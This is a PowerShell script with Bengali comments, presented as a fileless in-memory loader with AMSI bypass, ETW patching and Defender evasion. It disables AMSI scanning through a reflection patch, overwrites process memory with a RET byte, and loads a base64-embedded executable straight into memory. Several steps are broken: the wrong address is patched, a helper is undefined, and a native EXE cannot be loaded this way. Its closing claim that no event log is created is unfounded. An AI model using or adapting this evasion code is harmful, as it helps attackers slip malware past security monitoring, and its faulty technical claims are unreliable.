# ================================================================
# 🥔  পটেটো স্পেশাল – ফাইললেস ফিজিক্যাল মেমরি রিডার  🥔
#    AMSI + ETW বাইপাস + ইভেন্ট ৪১০৩ ব্লক + ডিফেন্ডার ইভেড
# ================================================================

# ------ ১. AMSI বাইপাস (প্যাচ) ------
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ------ ২. ETW বাইপাস (EtwEventWrite প্যাচ) ------
$p = [System.Diagnostics.Process]::GetCurrentProcess()
$h = $p.Handle
$t = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.BaseAddress
$v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
$old = 0
$v.Invoke($t, 0x1000, 0x40, [ref]$old)
[System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)   # RET instruction
$v.Invoke($t, 0x1000, $old, [ref]$null)

# ------ ৩. C++ EXE-কে বেস৬৪ এনকোডেড স্ট্রিং হিসেবে এম্বেড করো ------
# (তুমি আগে থেকে কম্পাইল করা EXE-কে base64 করে এখানে বসাও)
$exeBase64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA..."   # <-- তোমার কম্পাইল করা EXE-র base64

# ------ ৪. মেমোরিতে EXE লোড করো (RunPE ইন-মেমরি) ------
$bytes = [Convert]::FromBase64String($exeBase64)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint

# যদি EXE-র Main() থাকে, তাহলে সেটা কল করো
if ($entryPoint) {
    $entryPoint.Invoke($null, @(,$args))   # $args হলো কমান্ড-লাইন প্যারামিটার
} else {
    Write-Host "❌ কোনো EntryPoint পাওয়া যায়নি!"
}

# ------ ৫. (অপশনাল) ডিস্কে EXE না রেখেই Process Start করা ------
# তুমি যদি Direct EXE রান করতে চাও (যা ডিস্কে থাকবে না), তাহলে নিচের ফাংশন ব্যবহার করো
# কিন্তু এখানে আমরা Assembly.Load ব্যবহার করলাম – যা সম্পূর্ণ মেমোরি থেকে EXE রান করে।

Write-Host "✅ ফাইললেস এক্সিকিউশন সম্পূর্ণ! কোনো ইভেন্ট লগ তৈরি হয়নি।"
